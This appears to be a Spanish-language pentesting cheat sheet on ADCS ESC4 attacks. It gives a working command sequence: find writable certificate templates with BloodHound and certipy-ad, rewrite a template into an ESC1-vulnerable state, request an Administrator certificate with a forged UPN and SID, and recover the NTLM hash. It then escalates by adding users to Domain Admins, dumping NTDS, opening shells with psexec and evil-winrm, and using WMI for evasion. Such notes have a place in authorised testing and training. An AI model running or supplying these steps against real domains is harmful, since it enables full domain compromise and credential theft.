# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC4 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 4 - Overly Permissive ACLs on Certificate Templates

Una vulnerabilidad de quien tiene permisos de escritura sobre LA PLANTILLA, se puede modificar su configuración ESC4 y hacerla explotable al ESC1.

En BloodHound buscar una `CertTemplate` donde mi usuario o un grupo al que pertenezco tenga permisos como:

- `GenericAll`
- `GenericWrite`
- `WriteDacl`
- `WriteOwner`

Ejemplo: 

* El icono en BloodHound, la **plantilla de certificado (Certificate Template)** aparece representada con el **icono de un certificado/documento** color morado.

- CA_SVC → MemberOf → CERT PUBLISHERS → GenericAll → DunderMifflinAuthentication
- Si el usuario en BloodHound pertenece al grupo **CA-OPERATOS o CERT PUBLISHERS** puede ser propenso al ESC4.  
* El usuario en su **Display Name = Certification Authority**

En BloodHound si se tiene permisos de **GenericAll** sobre la `CertTemplate`.

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
```

## ESC 4: Forma 1 - AD Moderno

```bash 
Paso 1:
# Guardar la configuración original en un archivo Json
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'Template_Name' -save-configuration Original.json

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios
	# template = Nombre de la plantilla vulnerable 

Paso 2:
# Modificar la plantilla vulnerable (ESC4) para volverlo ESC1
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'Template_Name' -write-default-configuration

	# Escribir 'Y' para sobreescribir la plantilla 
```

```bash 
Paso 3: Si el AD es moderno esta es la mejor opción 
# Obtener el SID del AD 
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' --get-sid
	Domain SID S-1-5-21-3085872742-570972823-736764132

# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA_Name' -target FQDN -template 'Template_Name' -upn 'Administrator@domain.local' -sid S-1-5-21-3085872742-570972823-736764132-500
	# Colocar el -500 al final del sid ya que se refiere al usuario admin

Paso 4:
Opción 1
# Autenticarse con el certificado obtenido
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Opción 2
# Autenticarse con el certificado obtenido y obtener una shell ldap
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC -ldap-shell 
	❯ add_user_to_group <user> "Domain Admins"   # Agregar un usuario 
	❯ exit   # Salir


Paso 5:
Opción 1
# Verificar las credenciales 
❯ nxc smb IP_DC -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff

Opción 2
# Verificar si se ha agregado el usuario 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!'


Paso 6:
# Ingresar al server 
❯ impacket-psexec administrator@<IP> -hashes :NThash
❯ evil-winrm -i IP_DC -u user -p 'P@$$w0rd123!'


NOTA:
	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
	- Puede que el usuario 'Administrator' no funcione, por lo que se debe de ver en Bloodhound que otros usuarios son admin y emitir el certificaado a su nombre. 
```

## ESC 4: Forma 2 - AD antiguo

```bash 
Paso 1:
# Guardar la configuración original en un archivo Json
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -save-configuration Original.json

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios
	# template = Nombre de la plantilla vulnerable 

Paso 2:
# Modificar la plantilla vulnerable (ESC4) para volverlo ESC1
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -write-default-configuration

	# Escribir 'Y' para sobreescribir la plantilla 
```

```bash 
Paso 3: Si el AD es antiguo usar esto
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@domain.local' -target IP_DC

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 4:
# Autenticarse usando el certificado obtenido y obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 5:
# Conectarse al server como Administrator 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
❯ impacket-psexec administrator@<IP> -hashes :NThash
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff


NOTA:
	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
	- Puede que el usuario 'Administrator' no funcione, por lo que se debe de ver en Bloodhound que otros usuarios son admin y emitir el certificaado a su nombre. 
```


